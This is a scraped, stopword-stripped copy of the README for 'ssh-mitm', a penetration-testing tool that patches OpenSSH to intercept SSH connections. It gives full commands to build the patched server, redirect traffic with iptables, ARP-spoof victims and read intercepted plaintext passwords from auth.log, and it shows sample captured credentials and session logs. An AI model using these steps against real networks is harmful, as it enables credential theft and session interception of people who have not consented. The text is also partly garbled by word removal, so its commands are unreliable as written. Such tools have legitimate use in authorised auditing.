{
	"_id": "14367000",
	"site": "https://github.com/jtesta/ssh-mitm",
	"title": "SSH man-in-the-middle tool",
	"author": "DLion",
	"date": "2017-06-13T13:57:07.801Z",
	"tags": {
		"categories": [
			"opensource",
			"penetration-testing",
			"ssh"
		],
		"languages": []
	},
	"content": "readme.md ssh mitm v1.0overview penetration testing tool allows auditor intercept ssh connections. patch applied the openssh v7.5p1 source code causes to act a proxy between victim their intended ssh server; plaintext passwords sessions are logged disk. course, victim's ssh client complain the server's key has changed. because 99.99999% the this is caused a legitimate action (os re-install, configuration change, etc), many/ users disregard warning continue .note: run modified sshd a vm container! ad-hoc edits were made the openssh sources critical regions, no regard their security implications. not hard imagine edits introduce serious vulnerabilities. until dependency root privileges is removed, sure only run code throw-away vms/containers. do is first release this tool. while is very useful -is, are nevertheless things improve:support sftp mitm'ing.add port forwarding support.remove dependency root privileges.create wrapper script detects user is trying use key authentication , and de-spoof automatically.initial setup1.) install zlib openssl headers:sudo apt install zlib1g-dev libssl-dev2.) download openssh v7.5p1 verify signature:wget https://ftp.openbsd.org/pub/openbsd/openssh/release_key.ascwget https://ftp.openbsd.org/pub/openbsd/openssh/portable/openssh-7.5p1.tar.gzwget https://ftp.openbsd.org/pub/openbsd/openssh/portable/openssh-7.5p1.tar.gz.ascgpg --import release_key.ascgpg --verify openssh-7.5p1.tar.gz.asc openssh-7.5p1.tar.gz3.) unpack tarball, patch sources, compile :tar xzf openssh-7.5p1.tar.gzpatch -p0 < openssh-7.5p1-mitm.patchmv openssh-7.5p1 openssh-7.5p1-mitm; cd openssh-7.5p1-mitm; ./configure ---sandbox= && make -j 104.) create keys setup environment:sudo ssh-keygen -t ed25519 -f /usr/local/etc/ssh_host_ed25519_key < /dev/nullsudo ssh-keygen -t rsa -b 4096 -f /usr/local/etc/ssh_host_rsa_key < /dev/nullsudo useradd -m sshd && sudo useradd -m bogus && sudo chmod 0700 ~sshd ~bogussudo mkdir /var/empty; sudo cp ssh ~bogus/running attack1.) run sshd:cd /path//openssh-7.5p1-mitmsudo $pwd/sshd -f $pwd/sshd_config2.) enable ip forwarding:sudo bash -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\"sudo iptables -p forward accept3.) allow connections sshd re-route forwarded ssh connections:sudo iptables - input -p tcp --dport 22 -j acceptsudo iptables -t nat - prerouting -p tcp --dport 22 -j redirect ---ports 224.) arp spoof target(s) (protip: not spoof the things! puny network interface won't likely able handle entire network's traffic at once. spoof couple ips a ):arpspoof -r -t 192.168.x.1 192.168.x.55.) monitor auth.log. intercepted passwords appear here:sudo tail -f /var/log/auth.log6.) once session is established, full log all input & output be found /home/bogus/session_*.txt.sample resultsupon success, /var/log/auth.log have lines log password, this:may 16 23:14:01 showmeyourmoves sshd[16798]: intercepted password: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]furthermore, victim's entire ssh session be found /home/bogus/session_*.txt:# cat /home/bogus/session_0.txtlast login: tue may 16 21:35:00 2017 10.50.22.xopenbsd 6.0-stable (generic.mp) #12: sat may 6 19:08:31 edt 2017welcome openbsd: proactively secure unix- operating system.please the sendbug(1) utility report bugs the system.before reporting bug, please try reproduce with latestversion the code. bug reports, please try ensure enough information reproduce problem is enclosed, if known fix it exists, include as .jdog@jefferson ~ $ ppss pid tt stat command59264 p0 ss 0:00.02 -bash (bash)52132 p0 r+p 0:00.00 psjdog@jefferson ~ $ iidduid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)jdog@jefferson ~ $ sssshh jjtteessttaa@@mmaaggiiccbbooxxjtesta@magicbox's password: roflc0pter!!1juannote the characters the user's commands appear twice the file the input the user is recorded, well the output the shell ( echoes characters ). observe when programs sudo ssh temporarily disable echoing order read password, duplicate characters are logged.developer documentation lol.h are defines: debug_host debug_port. enable and set hostname a test server. you connect sshd directly without using arp spoofing order test changes, e.g.:ssh valid_user_on_debug_host@localhost create new patch, these commands:pushd openssh-7.5p1-mitm/; clean; popddiff -ru ---file -x '*~' -x 'config.*' -x makefile. -x makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1 openssh-7.5p1-mitm/ > openssh-7.5p1-mitm.patch"
}